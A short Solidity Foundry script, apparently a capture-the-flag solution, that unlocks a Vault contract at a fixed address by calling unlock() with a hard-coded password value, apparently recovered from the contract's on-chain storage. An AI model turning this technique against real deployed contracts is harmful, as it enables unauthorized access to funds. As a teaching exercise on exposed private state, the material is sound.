// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Script} from "forge-std/Script.sol";
import {Vault} from "../src/Vault.sol";

contract VaultSolution is Script {
    Vault public vault = Vault(0xE319063FBE3D0d270c4F5bE0593E7F8BFEB7b9C2);
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        vault.unlock(0x412076657279207374726f6e67207365637265742070617373776f7264203a29);
        vm.stopBroadcast();
    }
}

